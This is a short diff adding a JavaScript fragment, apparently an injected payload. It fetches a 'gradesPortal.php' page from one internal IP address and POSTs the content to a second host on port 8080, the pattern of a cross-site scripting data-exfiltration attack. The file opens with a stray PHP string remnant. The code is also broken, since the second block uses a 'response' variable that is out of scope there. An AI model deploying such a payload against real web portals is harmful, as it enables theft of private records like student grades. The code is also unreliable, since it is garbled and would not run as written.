@@ -1,0 +1,46 @@
+'] . "</p>";
+
+(async () => {
+    const url = 'http://192.168.1.203/gradesPortal.php';
+
+    try {
+        const response = await fetch(url);
+
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+        const data = await response.text();
+
+        console.log('Success:', data);
+        return data;
+
+    } catch (error) {
+        console.error('Fetch failed:', error);
+        return null;
+    }
+})();
+
+let bodyContent = response;
+const url = 'http://192.168.1.201:8080';
+
+(async () => {
+
+    try {
+        const response = await fetch(url, {
+            method: 'POST',
+            body: bodyContent,
+        });
+
+        if (!response.ok) {
+            throw new Error(`HTTP error! Status: ${response.status}`);
+        }
+        const data = await response.text();
+
+        console.log('Success:', data);
+        return data;
+
+    } catch (error) {
+        console.error('Fetch failed:', error);
+        return null;
+    }
+})();
